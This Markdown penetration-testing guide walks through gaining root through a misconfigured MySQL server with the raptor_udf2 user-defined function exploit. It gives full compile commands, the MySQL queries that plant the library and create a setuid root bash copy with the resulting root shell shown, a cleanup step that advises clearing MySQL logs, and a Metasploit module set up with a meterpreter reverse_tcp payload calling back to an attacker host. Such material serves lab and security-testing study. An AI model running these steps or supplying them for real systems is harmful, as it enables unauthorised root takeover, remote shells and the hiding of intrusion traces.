# MySQL

## 01 - Unix Shell

### 1.1 - Detect

Exploiting misconfigured services with root access such as MySQL databases can pose a real risk that an attacker can take full control. If the following requirements has been met. MySQL whatever if MySQL has password database or no authentication which makes things even easier for the hacker.

Install the following dependencies

`$ sudo apt install default-libmysqlclient-dev`

We have lookup via `searchsploit` tool with a set of local copies of the exploitdb that is stored on the hacker's machine

`$ searchsploit mysql user-defined function`

`$ searchsploit -x 1518`

This [MySQL exploit](https://www.exploit-db.com/exploits/1518) has comments that explains with the builtin function for `do_system()` in MySQL that has something to do with misconfigurations with root access that allows the attacker to take full control. Follow the instructions of what the author wrote to compile the exploit.

### 1.2 - Exploit

```
$ gcc -g -c raptor_udf2.c -fPIC
$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Once the exploit is ready. Authenticate with the MySQL credentials with root privileges

```
$ mysql -u root

mysql> SHOW VARIABLES LIKE '%plugin%';

mysql> SHOW VARIABLES LIKE '%secure_file_priv%';

mysql> USE mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> CREATE TABLE newtbl(LINE BLOB);
Query OK, 0 rows affected (0.01 sec)

mysql> INSERT INTO newtbl VALUES(LOAD_FILE('/home/user/raptor_udf2.so'));
Query OK, 1 row affected (0.00 sec)

mysql> SELECT * FROM newtbl INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
Query OK, 1 row affected (0.00 sec)

mysql> CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
Query OK, 1 row affected (0.00 sec)

mysql> SELECT do_system('cp /bin/bash /tmp/mysql-service; chmod +xs /tmp/mysql-service');
+----------------------------------------------------------------------------+
| do_system('cp /bin/bash /tmp/mysql-service; chmod +xs /tmp/mysql-service') |
+----------------------------------------------------------------------------+
|                                                                          0 |
+----------------------------------------------------------------------------+
1 row in set (0.01 sec)

user@debian:~$ ls -lh /tmp/mysql-service
-rwsr-s--x 1 root root 905K Jan 19 20:18 /tmp/mysql-service
user@debian:~$ /tmp/mysql-service -p
mysql-service-4.1# whoami
root
```

**TODO:** Write about this

Another way to exploit the MySQL service but this technique we'll be using it to transfer the file by copying the shared object file as in binary encoded text to execute MySQL query.

`$ searchsploit mysql user-defined`

`$ searchsploit -x 46249`

### 1.3 - Cleanup

TODO: Finish this info

Once it was successfully exploited. Get rid of the table you've created and clear the MySQL logs as well.

`mysql> TRUNCATE TABLE newtbl;`

## 02 - Metasploit

```
msf > use exploit/multi/mysql/mysql_udf_payload

msf exploit(multi/mysql/mysql_udf_payload) > options

Module options (exploit/multi/mysql/mysql_udf_payload): 

   Name              Current Setting  Required  Description 
   ----              ---------------  --------  ----------- 
   FORCE_UDF_UPLOAD  false            no        Always attempt to install a sys_exec() mysql.function. 
   PASSWORD                           no        The password for the specified username 
   RHOSTS                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit 
   RPORT             3306             yes       The target port (TCP) 
   SRVHOST           0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to l 
                                                isten on all addresses. 
   SRVPORT           8080             yes       The local port to listen on. 
   SSL               false            no        Negotiate SSL for incoming connections 
   SSLCert                            no        Path to a custom SSL certificate (default is randomly generated) 
   URIPATH                            no        The URI to use for this exploit (default is random) 
   USERNAME          root             no        The username to authenticate as 


Payload options (linux/x86/meterpreter/reverse_tcp): 

   Name   Current Setting  Required  Description 
   ----   ---------------  --------  ----------- 
   LHOST                   yes       The listen address (an interface may be specified) 
   LPORT  4444             yes       The listen port 


Exploit target: 

   Id  Name 
   --  ---- 
   0   Windows 


msf exploit(multi/mysql/mysql_udf_payload) > set target Linux

msf exploit(multi/mysql/mysql_udf_payload) > set rhosts <IP>

msf exploit(multi/mysql/mysql_udf_payload) > set username <username>

msf exploit(multi/mysql/mysql_udf_payload) > set password <password>

msf exploit(multi/mysql/mysql_udf_payload) > set lhost <IP>

msf exploit(multi/mysql/mysql_udf_payload) > run
```

## References

- [MySQL UDF Basics and Exploitation](https://blog.certcube.com/mysql-udf-basics-and-exploitation/)

- [Privilege Escalation with MySQL User Defined Functions](https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf)

- [Lib MySQLUDF_Sys](https://github.com/mysqludf/lib_mysqludf_sys)

- [Database Takeover User-Defined Functions (UDF) for MySQL and PostgreSQL Github repository](https://github.com/sqlmapproject/udfhack)

- [MySQL Show Privileges Statement](https://www.tutorialspoint.com/mysql/mysql_show_privileges_statement.htm)
